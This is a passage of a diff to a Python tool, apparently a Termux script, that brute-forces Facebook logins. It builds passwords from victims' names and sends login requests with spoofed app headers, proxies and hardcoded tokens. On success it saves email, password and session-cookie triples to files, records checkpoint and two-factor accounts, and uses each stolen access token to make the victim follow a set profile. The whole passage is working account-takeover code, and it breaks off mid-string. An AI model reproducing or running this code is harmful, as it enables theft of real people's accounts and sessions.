-                                print(f"\033[1;31m⤷ EMAIL: {ids}")
-                                print(f"\033[1;31m⤷ PASS: {pas}\033[0m")
-                                open('/sdcard/VENOM-CP.txt', 'a').write(ids+'|'+pas+'|'+data_names[i]+'|'+current_ip+'\n')
-                                cps.append(ids)
-                                return  
-                
-                except requests.exceptions.ConnectionError:
-                    ip_pool = generate_ip_pool(50)
-                    time.sleep(random.uniform(3, 7))
-                    continue
-                except requests.exceptions.Timeout:
-                    continue
-                except Exception as e:
-                    continue
-            continue
-            
-        loop += 1
-        
-    except requests.exceptions.ConnectionError:
-        ip_pool = generate_ip_pool(100)
-        time.sleep(10)
-    except Exception as e:
-        pass
-def M_file_4(ids,names,passlist):
-                try:
-                        global ok,loop,sim_id
+                        global ok, loop
                         boos = random.choice([P, M, H, K, B, U, O, N])
-                        sys.stdout.write(f'\r\r\033[1;37m[{boos}VENOM-𝐌1\033[1;37m]\033[1;97m %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                        fn = names.split(' ')[0]
+                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}DJALIL_MK\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
                         sys.stdout.flush()
                         
+                        fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
                         except:
@@ -1122,8 +546,7 @@ def M_file_4(ids,names,passlist):
                                 
                         for pw in passlist:
                                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                                #sm_mdl=('Infinix X689B', 'Samsung Galaxy S21', 'Google Pixel 5', 'OnePlus 9', 'Xiaomi Mi 11','LG V60 ThinQ', 'Sony Xperia 1 II', 'Huawei P40 Pro', 'Motorola Edge+', 'Nokia 8.3','OnePlus Nord', 'Xiaomi Redmi Note 10 Pro', 'Google Pixel 4a', 'Samsung Galaxy A52','Sony Xperia 5 II', 'LG Velvet', 'Motorola Moto G Power', 'Nokia 7.2', 'Huawei Mate 40 Pro','Samsung Galaxy S20 FE', 'OnePlus 8T', 'Xiaomi Poco X3', 'Google Pixel 4 XL', 'Sony Xperia 10 II','Motorola Razr', 'LG Wing', 'Nokia 9 PureView', 'Huawei P30 Pro', 'Samsung Galaxy Note 20 Ultra','OnePlus 8 Pro', 'Xiaomi Mi 10 Pro', 'Google Pixel 3a XL', 'Sony Xperia 1 III', 'LG G8 ThinQ','Motorola Moto G Stylus', 'Nokia 6.2', 'Huawei Mate Xs', 'Samsung Galaxy Z Fold 2','OnePlus 7T Pro', 'Xiaomi Mi 9T Pro', 'Google Pixel 3 XL', 'Sony Xperia 5 III', 'LG G7 ThinQ','Motorola Moto G Fast', 'Nokia 5.3', 'Huawei Nova 7i', 'Samsung Galaxy Z Flip', 'OnePlus 7 Pro','Xiaomi Mi Note 10', 'Google Pixel 3a', 'Sony Xperia XZ3', 'LG K92 5G', 'Motorola Moto G Play','Nokia 3.4', 'Huawei Y9s', 'Samsung Galaxy S10 Lite', 'OnePlus Nord N10', 'Xiaomi Redmi Note 9 Pro','Google Pixel 3', 'Sony Xperia XZ2', 'LG K61', 'Motorola Moto G9 Power', 'Nokia 2.4','Huawei P20 Pro', 'Samsung Galaxy A71', 'OnePlus Nord N100', 'Xiaomi Redmi Note 8 Pro','Google Pixel 2 XL', 'Sony Xperia L4', 'LG Q70', 'Motorola Moto E7 Plus', 'Nokia 1.3','Huawei P Smart 2021', 'Samsung Galaxy A50', 'OnePlus 6T', 'Xiaomi Redmi Note 7 Pro','Google Pixel 2', 'Sony Xperia 10 Plus', 'LG K51', 'Motorola Moto E6', 'Nokia 1 Plus','Huawei P10', 'Samsung Galaxy A20', 'OnePlus 6', 'Xiaomi Mi A3', 'Google Pixel XL','Sony Xperia XA2', 'LG Stylo 6', 'Motorola Moto E5 Plus', 'Nokia 2.3')
-                                u1a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/1.8.0 (Linux; U; Android 11.0; Galaxy S21 Build/9LM88CD) [FBAN/FB4A;FBAV/119.0.0.93.51FBBV/8234567FBDM/{density=3.0,width=1080,height=1920}FBLC/fr_FRFBRV/6347852FBCR/VerizonFBMF/SamsungFBBD/SamsungFBPN/com.facebook.liteFBDV/Galaxy S21FBSV/11.0FBOP/1FBCA/armeabi-v7a]'+'Dalvik/1.8.0 (Linux; U; Android 10.0; Xperia 5 II Build/7PQ56EF) [FBAN/FB4A;FBAV/120.0.0.45.123FBBV/9123456FBDM/{density=2.5,width=1440,height=2560}FBLC/ar_EGFBRV/7854632FBCR/OrangeFBMF/SonyFBBD/SonyFBPN/com.facebook.katanaFBDV/Xperia 5 IIFBSV/10.0FBOP/1FBCA/arm64-v8a]'+'Dalvik/2.1.0 (Linux; U; Android 4; Build/SP1A.949257.425) [FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845461;FBDM/{density=3.0,width=1280,height=1920};FBLC/en_US;FBRV/0;FBCR/Raketun;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo y66;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/MessengerLite;FBAV/278.0.0.29.121;FBBV/202740360;FBDM/{density=1,width=407,height=1218};FBLC/it_IT;FBRV/207023749;FBCR/Sprint;FBMF/xiaomi;FBBD/xiaomi EIN;FBPN/com.facebook.orca;FBSV/7.1;FBOP/13;FBCA/armeabi;]'+'[FBAN/Orca-Android;FBAV/86.0.0.37.86;FBBV/54200202;FBDM/{density=1.4,width=608,height=716};FBLC/it_IT;FBRV/112499470;FBCR/Telia;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.orca;FBBD/tecno X44;FBSV/4.7;FBOP/3;FBCA/armeabi-v7a;]"
+                                u1a = "[FBAN/FB4A;FBAV/392.0.0.32.108;FBBV/318413147;[FBAN/FB4A;FBAV/392.0.0.32.108;FBPN/com.facebook.katana;FBLC/en_US;FBBV/318413147;FBCR/MetroPCS;FBMF/OPPO;FBBD/oppo;FBDV/CPH2207;FBSV/14.5.0;FBCA/x86_64:x86:arm64-v8a;FBDM/{density=1.8,width=1345,height=1023};FB_FW/1;FBRV/318805181;]"+"[FBAN/FB4A;FBAV/391.1.0.37.104;FBBV/318217130;[FBAN/FB4A;FBAV/391.1.0.37.104;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/318217130;FBCR/PremiumSIM;FBMF/Samsung;FBBD/samsung;FBDV/SM-J105F;FBSV/12.6.2;FBCA/arm64-v8a:;FBDM/{density=3.0,width=536,height=1820};FB_FW/1;]"+"[FBAN/FB4A;FBAV/31.0.0.0.0;FBBV/7930627;[FBAN/FB4A;FBAV/31.0.0.0.0;FBPN/com.facebook.katana;FBLC/en_US;FBBV/7930627;FBCR/Verizon;FBMF/Vivo;FBBD/vivo;FBDV/V17 Pro;FBSV/5.5.2;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.75,width=774,height=2521};FB_FW/1;] FBBK/1]"+"[FBAN/FB4A;FBAV/139.0.0.26.93;FBBV/70506848;[FBAN/FB4A;FBAV/139.0.0.26.93;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/70506848;FBCR/Smartmobil;FBMF/Vivo;FBBD/vivo;FBDV/Y69;FBSV/9.7.0;FBCA/x86_64:armeabi-v7a;FBDM/{density=1.875,width=783,height=733};FB_FW/1;FBRV/70645913;]"+"[FBAN/FB4A;FBAV/465.0.0.0.6;FBBV/452000754;[FBAN/FB4A;FBAV/465.0.0.0.6;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/452000754;FBCR/Telstra;FBMF/Samsung;FBBD/samsung;FBDV/SM-J200F;FBSV/15.6.1;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.278,width=684,height=1221};]"+"[FBAN/FB4A;FBAV/174.0.0.54.96;FBBV/111133949;[FBAN/FB4A;FBAV/174.0.0.54.96;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/111133949;FBCR/NettoKOM;FBMF/OPPO;FBBD/oppo;FBDV/CPH1602;FBSV/11.7.4;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.5,width=443,height=2323};]"+"[FBAN/FB4A;FBAV/343.0.0.37.117;FBBV/308616431;[FBAN/FB4A;FBAV/343.0.0.37.117;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/308616431;FBCR/Vodafone UK;FBMF/OPPO;FBBD/oppo;FBDV/CPH1931;FBSV/14.5.1;FBCA/x86:arm64-v8a:armeabi-v7a;FBDM/{density=1.5,width=689,height=2482};FB_FW/1;] FBBK/1]"+"[FBAN/FB4A;FBAV/138.0.0.19.93;FBBV/69169467;[FBAN/FB4A;FBAV/138.0.0.19.93;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/69169467;FBCR/Boost Mobile;FBMF/Sony;FBBD/sony;FBDV/XQ-CC52;FBSV/9.8.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.9,width=1435,height=2415};FB_FW/1;FBRV/69307490;] FBBK/1]"+"[FBAN/FB4A;FBAV/184.0.0.41.79;FBBV/119894354;[FBAN/FB4A;FBAV/184.0.0.41.79;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/119894354;FBCR/Coles Mobile;FBMF/OPPO;FBBD/oppo;FBDV/CPH1607;FBSV/8.9.2;FBCA/arm64-v8a:;FBDM/{density=2.8,width=868,height=1190};FB_FW/1;FBRV/120078453;]"+"[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649449;[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649449;FBDM/{density=2.2,width=545,height=753};FBLC/en_US;FBRV/156872539;FB_FW/2;FBCR/Visible;FBMF/Vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/Y30e;FBSV/9.8.0;FBOP/20;FBCA/x86:arm64-v8a:armeabi-v7a;]"+"[FBAN/FB4A;FBAV/356.0.0.28.112;FBBV/311215741;[FBAN/FB4A;FBAV/356.0.0.28.112;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/311215741;FBCR/SaskTel;FBMF/OPPO;FBBD/oppo;FBDV/CPH1845;FBSV/12.8.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.875,width=1253,height=1834};]"+"[FBAN/FB4A;FBAV/407.0.0.30.97;FBBV/440412261;[FBAN/FB4A;FBAV/407.0.0.30.97;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/440412261;FBCR/TPG Telecom;FBMF/Vivo;FBBD/vivo;FBDV/V5;FBSV/12.6.1;FBCA/x86_64:armeabi-v7a;FBDM/{density=2.8,width=709,height=1043};FB_FW/1;]"
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 nip=random.choice(proxsi)
@@ -1158,22 +581,154 @@ def M_file_4(ids,names,passlist):
                                 
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
-                                        print(f"\n\033[1;32m⤷⤷ VENOM-OK")
-                                        print(f"\033[1;32m⤷ EMAIL: {ids}")
-                                        print(f"\033[1;31m⤷ PASS: {pas}")
-                                        print(f"\033[1;32m⤷ JOINED: {asha(ids)}\033[0m")
-                                        send_result("OK", ids, pas)
+                                        print('\r\x1b[1;92m<[DJALIL_MK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                        print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+cookie)
                                         token = q['access_token']
-                                        requests.post('https://graph.facebook.com/' + '100000525450858/' + 'subscribers' + '?access_token=' + token)
-                                        open('/sdcard/VENOM_m66_OK.txt','a').write(ids+'|'+pas+'\n')
+                                        requests.post('https://graph.facebook.com/' + '833553969/' + 'subscribers' + '?access_token=' + token)
+                                        open('/sdcard/DJALIL_MK_m1_OK.txt', 'a').write(ids + '|' + pas + '\n')
+                                        open('/sdcard/DJALIL_MKDJALIL_MK_iDs_COOKiE_M1.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
+                                        oks.append(ids)
+                                        break
+                                        
+                                elif twf in str(po):
+                                        if 'y' in pcp:
+                                                #print('\r\r\033[1;34m<[DJALIL_MK-2F]> '+ids+' | '+pas)
+                                                open('/sdcard/DJALIL_MK-2F.txt','a').write(ids+'|'+pas+'\n')
+                                                twf.append(ids)
+                                                break
+              
+                                elif 'www.facebook.com' in q['error']['message']:
+                                        if 'y' in pcp:
+                                                print('\r\x1b[38;5;246m<[DJALIL_MK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                                open('/sdcard/DJALIL_MK-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                cps.append(ids)
+                                                break
+                                        else:
+                                                open('/sdcard/DJALIL_MK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                else:
+                                        continue
+                                        
+                        loop+=1
+                        
+                except requests.exceptions.ConnectionError:
+                        time.sleep(10)
+                        
+                except Exception as e:
+                        pass
+
+#------------------[  METODE 2  ]-------------------#
+def M_file_2(ids,names,passlist):
+                try:
+                        global ok, loop
+                        boos = random.choice([P, M, H, K, B, U, O, N])
+                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}DJALIL_MK\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
+                        sys.stdout.flush()
+                        
+                        fn = names.split(' ')[0]
+                        try:
+                                ln = names.split(' ')[1]
+                        except:
+                                ln = fn
+                                
+                        for pw in passlist:
+                                pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
+                                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                                u2a = "[FBAN/FB4A;FBAV/392.0.0.32.108;FBBV/318413147;[FBAN/FB4A;FBAV/392.0.0.32.108;FBPN/com.facebook.katana;FBLC/en_US;FBBV/318413147;FBCR/MetroPCS;FBMF/OPPO;FBBD/oppo;FBDV/CPH2207;FBSV/14.5.0;FBCA/x86_64:x86:arm64-v8a;FBDM/{density=1.8,width=1345,height=1023};FB_FW/1;FBRV/318805181;]"+"[FBAN/FB4A;FBAV/391.1.0.37.104;FBBV/318217130;[FBAN/FB4A;FBAV/391.1.0.37.104;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/318217130;FBCR/PremiumSIM;FBMF/Samsung;FBBD/samsung;FBDV/SM-J105F;FBSV/12.6.2;FBCA/arm64-v8a:;FBDM/{density=3.0,width=536,height=1820};FB_FW/1;]"+"[FBAN/FB4A;FBAV/31.0.0.0.0;FBBV/7930627;[FBAN/FB4A;FBAV/31.0.0.0.0;FBPN/com.facebook.katana;FBLC/en_US;FBBV/7930627;FBCR/Verizon;FBMF/Vivo;FBBD/vivo;FBDV/V17 Pro;FBSV/5.5.2;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.75,width=774,height=2521};FB_FW/1;] FBBK/1]"+"[FBAN/FB4A;FBAV/139.0.0.26.93;FBBV/70506848;[FBAN/FB4A;FBAV/139.0.0.26.93;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/70506848;FBCR/Smartmobil;FBMF/Vivo;FBBD/vivo;FBDV/Y69;FBSV/9.7.0;FBCA/x86_64:armeabi-v7a;FBDM/{density=1.875,width=783,height=733};FB_FW/1;FBRV/70645913;]"+"[FBAN/FB4A;FBAV/465.0.0.0.6;FBBV/452000754;[FBAN/FB4A;FBAV/465.0.0.0.6;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/452000754;FBCR/Telstra;FBMF/Samsung;FBBD/samsung;FBDV/SM-J200F;FBSV/15.6.1;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.278,width=684,height=1221};]"+"[FBAN/FB4A;FBAV/174.0.0.54.96;FBBV/111133949;[FBAN/FB4A;FBAV/174.0.0.54.96;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/111133949;FBCR/NettoKOM;FBMF/OPPO;FBBD/oppo;FBDV/CPH1602;FBSV/11.7.4;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.5,width=443,height=2323};]"+"[FBAN/FB4A;FBAV/343.0.0.37.117;FBBV/308616431;[FBAN/FB4A;FBAV/343.0.0.37.117;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/308616431;FBCR/Vodafone UK;FBMF/OPPO;FBBD/oppo;FBDV/CPH1931;FBSV/14.5.1;FBCA/x86:arm64-v8a:armeabi-v7a;FBDM/{density=1.5,width=689,height=2482};FB_FW/1;] FBBK/1]"+"[FBAN/FB4A;FBAV/138.0.0.19.93;FBBV/69169467;[FBAN/FB4A;FBAV/138.0.0.19.93;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/69169467;FBCR/Boost Mobile;FBMF/Sony;FBBD/sony;FBDV/XQ-CC52;FBSV/9.8.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.9,width=1435,height=2415};FB_FW/1;FBRV/69307490;] FBBK/1]"+"[FBAN/FB4A;FBAV/184.0.0.41.79;FBBV/119894354;[FBAN/FB4A;FBAV/184.0.0.41.79;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/119894354;FBCR/Coles Mobile;FBMF/OPPO;FBBD/oppo;FBDV/CPH1607;FBSV/8.9.2;FBCA/arm64-v8a:;FBDM/{density=2.8,width=868,height=1190};FB_FW/1;FBRV/120078453;]"+"[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649449;[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649449;FBDM/{density=2.2,width=545,height=753};FBLC/en_US;FBRV/156872539;FB_FW/2;FBCR/Visible;FBMF/Vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/Y30e;FBSV/9.8.0;FBOP/20;FBCA/x86:arm64-v8a:armeabi-v7a;]"+"[FBAN/FB4A;FBAV/356.0.0.28.112;FBBV/311215741;[FBAN/FB4A;FBAV/356.0.0.28.112;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/311215741;FBCR/SaskTel;FBMF/OPPO;FBBD/oppo;FBDV/CPH1845;FBSV/12.8.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.875,width=1253,height=1834};]"+"[FBAN/FB4A;FBAV/407.0.0.30.97;FBBV/440412261;[FBAN/FB4A;FBAV/407.0.0.30.97;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/440412261;FBCR/TPG Telecom;FBMF/Vivo;FBBD/vivo;FBDV/V5;FBSV/12.6.1;FBCA/x86_64:armeabi-v7a;FBDM/{density=2.8,width=709,height=1043};FB_FW/1;]"
+                                head = {'User-Agent': u2a,'Accept-Encoding': 'gzip, deflate','Connection': 'Keep-Alive','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
+                                data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'fr_DZ','client_country_code': 'DZ','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+                                data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'es_ES','client_country_code': 'ES','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+                                
+                                url = 'https://b-graph.facebook.com/auth/login'
+                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                                
+                                po = requests.post(url, data=data, headers=head, allow_redirects=False).text
+                                q = json.loads(po)
+                                
+                                if 'session_key' in q:
+                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
+                                        print('\r\x1b[1;92m<[DJALIL_MK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                        print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+cookie)
+                                        token = q['access_token']
+                                        requests.post('https://graph.facebook.com/' + '833553969/' + 'subscribers' + '?access_token=' + token)
+                                        open('/sdcard/DJALIL_MK_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/DJALIL_MK_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                                        oks.append(ids)
+                                        break
+                                        
+                                elif twf in str(po):
+                                        if 'y' in pcp:
+                                                #print('\r\r\033[1;34m<[DJALIL_MK-2F]> '+ids+' | '+pas)
+                                                open('/sdcard/DJALIL_MK-2F.txt','a').write(ids+'|'+pas+'\n')
+                                                twf.append(ids)
+                                                break
+        
+                                elif 'www.facebook.com' in q['error']['message']:
+                                        if 'y' in pcp:
+                                                print('\r\x1b[38;5;246m<[DJALIL_MK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                                open('/sdcard/DJALIL_MK-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                cps.append(ids)
+                                                break
+                                        else:
+                                                open('/sdcard/DJALIL_MK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                else:
+                                        continue
+                                        
+                        loop+=1
+                        
+                except requests.exceptions.ConnectionError:
+                        time.sleep(10)
+                        
+                except Exception as e:
+                        pass
+
+#------------------[  METODE 3  ]-------------------#
+def M_file_3(ids,names,passlist):
+                try:
+                        global ok,loop
+                        boos = random.choice([P, M, H, K, B, U, O, N])
+                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}DJALIL_MK\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
+                        sys.stdout.flush()
+                        
+                        fn = names.split(' ')[0]
+                        try:
+                                ln = names.split(' ')[1]
+                        except:
+                                ln = fn
+                                
+                        for pw in passlist:
+                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+                                
+                                ua = "[FBAN/FB4A;FBAV/392.0.0.32.108;FBBV/318413147;[FBAN/FB4A;FBAV/392.0.0.32.108;FBPN/com.facebook.katana;FBLC/en_US;FBBV/318413147;FBCR/MetroPCS;FBMF/OPPO;FBBD/oppo;FBDV/CPH2207;FBSV/14.5.0;FBCA/x86_64:x86:arm64-v8a;FBDM/{density=1.8,width=1345,height=1023};FB_FW/1;FBRV/318805181;]"+"[FBAN/FB4A;FBAV/391.1.0.37.104;FBBV/318217130;[FBAN/FB4A;FBAV/391.1.0.37.104;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/318217130;FBCR/PremiumSIM;FBMF/Samsung;FBBD/samsung;FBDV/SM-J105F;FBSV/12.6.2;FBCA/arm64-v8a:;FBDM/{density=3.0,width=536,height=1820};FB_FW/1;]"+"[FBAN/FB4A;FBAV/31.0.0.0.0;FBBV/7930627;[FBAN/FB4A;FBAV/31.0.0.0.0;FBPN/com.facebook.katana;FBLC/en_US;FBBV/7930627;FBCR/Verizon;FBMF/Vivo;FBBD/vivo;FBDV/V17 Pro;FBSV/5.5.2;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.75,width=774,height=2521};FB_FW/1;] FBBK/1]"+"[FBAN/FB4A;FBAV/139.0.0.26.93;FBBV/70506848;[FBAN/FB4A;FBAV/139.0.0.26.93;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/70506848;FBCR/Smartmobil;FBMF/Vivo;FBBD/vivo;FBDV/Y69;FBSV/9.7.0;FBCA/x86_64:armeabi-v7a;FBDM/{density=1.875,width=783,height=733};FB_FW/1;FBRV/70645913;]"+"[FBAN/FB4A;FBAV/465.0.0.0.6;FBBV/452000754;[FBAN/FB4A;FBAV/465.0.0.0.6;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/452000754;FBCR/Telstra;FBMF/Samsung;FBBD/samsung;FBDV/SM-J200F;FBSV/15.6.1;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.278,width=684,height=1221};]"+"[FBAN/FB4A;FBAV/174.0.0.54.96;FBBV/111133949;[FBAN/FB4A;FBAV/174.0.0.54.96;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/111133949;FBCR/NettoKOM;FBMF/OPPO;FBBD/oppo;FBDV/CPH1602;FBSV/11.7.4;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.5,width=443,height=2323};]"+"[FBAN/FB4A;FBAV/343.0.0.37.117;FBBV/308616431;[FBAN/FB4A;FBAV/343.0.0.37.117;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/308616431;FBCR/Vodafone UK;FBMF/OPPO;FBBD/oppo;FBDV/CPH1931;FBSV/14.5.1;FBCA/x86:arm64-v8a:armeabi-v7a;FBDM/{density=1.5,width=689,height=2482};FB_FW/1;] FBBK/1]"+"[FBAN/FB4A;FBAV/138.0.0.19.93;FBBV/69169467;[FBAN/FB4A;FBAV/138.0.0.19.93;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/69169467;FBCR/Boost Mobile;FBMF/Sony;FBBD/sony;FBDV/XQ-CC52;FBSV/9.8.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.9,width=1435,height=2415};FB_FW/1;FBRV/69307490;] FBBK/1]"+"[FBAN/FB4A;FBAV/184.0.0.41.79;FBBV/119894354;[FBAN/FB4A;FBAV/184.0.0.41.79;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/119894354;FBCR/Coles 